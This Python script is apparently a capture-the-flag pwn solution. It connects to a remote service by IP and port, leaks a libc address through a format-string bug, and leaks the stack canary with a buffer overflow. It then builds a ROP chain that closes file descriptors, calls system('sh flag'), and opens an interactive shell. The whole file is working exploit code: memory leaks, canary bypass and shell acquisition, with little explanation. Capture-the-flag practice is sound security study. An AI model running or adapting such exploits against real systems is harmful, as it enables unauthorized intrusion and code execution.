#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from binaryfang import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./pwn")
p = remote("106.75.64.61", 16356)

p.recvuntil("option:")

secret_bss = 0x602068

def make_board(buf):
    p.sendline("2")
    p.recvuntil("bored...\n")
    p.send(buf)
    time.sleep(0.2)
    p.recvuntil("y/n\n")
    p.send("y")
    p.recvuntil("option:")

def spray(buf, ranger):

    p.sendline("2")
    p.recvuntil("bored...\n")
    for i in range(ranger):
        p.send(buf)
        p.recvuntil("y/n\n")
        p.send("n")
        p.recvuntil("bored...")
    p.send(buf)
    p.recvuntil("y/n\n")
    p.send("y")
    p.recvuntil("option:")

def stack(content):

    p.sendline("1")
    p.recvuntil("once..\n")
    p.send(content)
    time.sleep(0.2)
    return p.recv()

def fmtstr(fmt):

    p.sendline("3")
    p.recvuntil("?)\n")
    p.send(fmt)
    time.sleep(0.2)
    return p.recvuntil("option:")

def secret(secret, shell=False):

    p.sendline("9011")
    p.recvuntil("code:")
    p.send(secret)
    if shell==True:
        p.interactive()
    else:
        p.recvuntil("option:")

#leak libc

data = fmtstr("%a")

libc_base = int(data.split("0x0.0")[1][:12],16)
print hex(libc_base)
libc = libc_base - 0x3c56a3
print hex(libc)
one_shot = libc + 0xf0a24
system = libc + 0x45390
close = libc + 0xf78e0
pop_rdi = 0x400c53
shell_sh = 0x602298


#leak canary
spray("a", 50)
data = stack("a" * 161 + "x" * 8)
canary = data.split("x" * 8)[1][:7]
canary = u64(canary.rjust(8,"\x00"))
print hex(canary)

payload = ""
for i in range(10):

    payload += p64(pop_rdi) + p64(i + 40) + p64(close)

payload += p64(pop_rdi) + p64(shell_sh) + p64(system) 
payload = payload.ljust(0x200, "\x00") + "sh flag"

make_board("a" * 8 + p64(canary) + "a" * 8 + payload)

c = 0
for i in range(1021):

    print c 
    secret("\x00" * 8)
    c += 1

secret("\x00" * 8, shell=True)
p.interactive()





